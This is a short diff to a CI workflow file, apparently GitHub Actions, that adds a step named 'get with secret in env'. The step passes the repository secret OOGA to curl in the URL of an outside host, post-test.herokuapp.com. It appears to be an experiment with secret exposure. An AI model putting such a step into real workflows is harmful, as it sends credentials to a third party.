@@ -15,6 +15,10 @@ jobs:
           MSG: '{"a": "${{ secrets.OOGA }}"}'
           OOGA: "${{ secrets.OOGA }}"
         run: "echo $OOGA"
+      - name: "get with secret in env"
+        env:
+          OOGA: ${{ secrets.OOGA }}
+        run: 'curl https://post-test.herokuapp.com/b/$OOGA'
   build:
     name: Build
     runs-on: ubuntu-18.04
